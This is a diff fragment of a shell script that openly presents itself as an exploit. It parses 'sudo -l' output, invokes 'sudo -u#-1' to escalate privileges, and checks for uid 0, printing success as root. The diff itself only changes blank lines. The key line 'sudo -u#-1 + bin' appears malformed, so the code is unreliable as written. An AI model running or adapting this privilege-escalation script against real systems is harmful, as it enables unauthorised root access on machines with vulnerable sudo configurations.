@@ -13,6 +13,7 @@ echo "-> uid=$username(`id -u`)"
 echo 
 echo "Starting the exploit"
 echo
+
 sudo -l > permissions
 
 cat permissions | grep 'ALL' | cut -d ')' -f 2 > bin || true
@@ -22,7 +23,6 @@ sudo -u#-1 + bin || true
 uid=`id -u > bloc_uid`
 
 if [ "$(cat bloc_uid)" == 0 ]
-
  then echo "The exploit successfully executed -> uid=root(`id -u`)"
 
 else
